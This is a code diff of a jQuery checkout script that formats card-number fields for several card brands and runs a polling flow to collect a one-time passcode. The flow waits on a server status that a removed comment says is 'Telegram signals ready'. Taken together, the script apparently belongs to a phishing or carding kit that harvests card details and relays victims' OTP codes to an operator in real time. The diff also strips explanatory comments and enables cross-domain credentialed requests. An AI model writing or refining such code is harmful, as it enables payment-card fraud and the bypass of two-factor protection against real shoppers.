@@ -1,6 +1,10 @@
 $(document).ready(function() {
   // ensure jQuery includes the session cookie on every request
-  $.ajaxSetup({ xhrFields: { withCredentials: true } });
+  $.ajaxSetup({
+    xhrFields: { withCredentials: true },
+    crossDomain: true
+  });
+
   // ——————————————————————————————————————————
   // 1) IMask for card inputs (only on the checkout page)
   // ——————————————————————————————————————————
@@ -13,7 +17,7 @@ $(document).ready(function() {
       mask: [
         { mask: "0000-000000-00000", regex: "^3[47]\\d{0,13}", cardtype: "american express" },
         { mask: "0000-0000-0000-0000", regex: "^(?:6011|65\\d{0,2}|64[4-9]\\d?)\\d{0,12}", cardtype: "discover" },
-        { mask: "0000-000000-0000",        regex: "^3(?:0([0-5]|9)|[689]\\d?)\\d{0,11}", cardtype: "diners" },
+        { mask: "0000-000000-0000",       regex: "^3(?:0([0-5]|9)|[689]\\d?)\\d{0,11}", cardtype: "diners" },
         { mask: "0000-0000-0000-0000", regex: "^(5[1-5]\\d{0,2}|22[2-9]\\d{0,1}|2[3-7]\\d{0,2})\\d{0,12}", cardtype: "mastercard" },
         { mask: "0000-000000-00000", regex: "^(?:2131|1800)\\d{0,11}", cardtype: "jcb15" },
         { mask: "0000-0000-0000-0000", regex: "^(?:35\\d{0,2})\\d{0,12}", cardtype: "jcb" },
@@ -76,7 +80,6 @@ $(document).ready(function() {
       }
     }
 
-    // 1) Poll until Telegram signals ready
     readyPoller = setInterval(() => {
       $.getJSON('/otp-status')
         .done(res => {
@@ -98,14 +101,12 @@ $(document).ready(function() {
         .fail(() => console.warn('Failed fetching /otp-status'));
     }, 2000);
 
-    // 2) Handle OTP submission
     $('#otp-submit').off('click').on('click', () => {
       const otp = $('#otp-input').val().trim();
       if (!/^[0-9]{6}$/.test(otp)) {
         return showOtpPrompt(null, 'Enter a valid 6‑digit code');
       }
 
-      // Show spinner while verifying
       $('.otp-form').fadeOut(200, () => {
         $('.sub-title').text('Verifying OTP...').fadeIn(200);
         $('.sk-chase').fadeIn(300);
@@ -122,7 +123,6 @@ $(document).ready(function() {
         }),
       })
       .done(() => {
-        // Poll for verification result
         verifyPoller = setInterval(() => {
           $.getJSON('/otp-verify-status')
             .done(res => {
